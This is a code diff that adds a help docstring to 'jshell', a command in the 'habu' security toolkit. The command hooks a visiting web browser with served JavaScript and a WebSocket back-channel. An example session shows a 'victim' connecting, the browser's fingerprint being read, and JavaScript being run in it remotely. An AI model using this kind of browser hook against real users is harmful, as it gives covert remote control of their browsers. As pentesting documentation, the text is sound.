@@ -290,6 +290,45 @@ async def handler(websocket, path):
 @click.option('-i', 'ip', default='127.0.0.1', help='IP to listen on')
 @click.option('-p', 'port', default=3333, help='Port to listen on')
 def cmd_jshell(ip, port, verbose):
+    """Control a web browser through Websockets.
+
+    Bind a port (default: 3333) and listen for HTTP connections.
+
+    On connection, send a JavaScript code that opens a WebSocket that
+    can be used to send commands to the connected browser.
+
+    You can write the commands directly in the shell, or use plugins, that
+    are simply external JavaScript files.
+
+    Using habu.jshell you can completely control a web browser.
+
+    Reference: https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API
+
+    Example:
+
+    \b
+    $ habu.jshell
+    >> Listening on 192.168.0.10:3333. Waiting for a victim connection.
+    >> HTTP Request received from 192.168.0.15. Sending hookjs
+    >> Connection from 192.168.0.15
+    $ _sessions
+    0 * 192.168.0.15:33432 Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0
+    $ _info
+    {
+        "user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0",
+        "location": "http://192.168.0.10:3333/",
+        "java-enabled": false,
+        "platform": "Linux x86_64",
+        "app-code-name": "Mozilla",
+        "app-name": "Netscape",
+        "app-version": "5.0 (X11)",
+        "cookie-enabled": true,
+        "language": "es-AR",
+        "online": true
+    }
+    $ document.location
+    http://192.168.0.10:3333/
+    """
 
     global hook_js
     hook_js = hook_js.format(ip=ip, port=port)
